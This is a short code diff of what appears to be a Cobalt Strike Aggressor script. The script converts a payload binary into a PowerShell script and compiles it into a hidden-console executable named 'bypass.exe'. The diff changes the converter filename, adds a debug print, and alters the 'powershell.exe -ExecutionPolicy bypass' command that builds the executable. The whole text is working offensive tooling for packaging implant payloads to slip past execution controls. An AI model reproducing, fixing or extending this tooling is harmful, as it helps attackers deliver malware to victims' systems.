@@ -40,7 +40,8 @@ sub payload_bin_to_ps1 {
 sub show {
 	$bin_path = $3["bin"];
 	$payload_file_ps1 = "C:\\windows\\temp\\payload_tmp.ps1";
-	$ps2exe = $path.'\.\\ps2exe.ps1';
+	$ps2exe = $path.'\.\\PS1toEXE.ps1';
+	println($ps2exe);
 	if (-exists $bin_path) {
 		payload_bin_to_ps1($bin_path,$payload_file_ps1);
 		$version = right($3["version"], 3);
@@ -48,7 +49,7 @@ sub show {
 		prompt_file_save("bypass.exe", {
 			$paths = "$1";
 			if ($int_version == "4") {
-				$process = exec('powershell.exe -ExecutionPolicy bypass -command "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$paths.' -noConsole -runtime40" ');
+				$process = exec('powershell.exe -ExecutionPolicy bypass "'.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$paths.' -noConsole -runtime40" ');
 			} else {
 				$process = exec('cmd.exe /c echo '.$ps2exe.' -inputFile '.$payload_file_ps1.' -outputFile '.$paths.' -noConsole -runtime20 | powershell -ExecutionPolicy bypass');
 			}
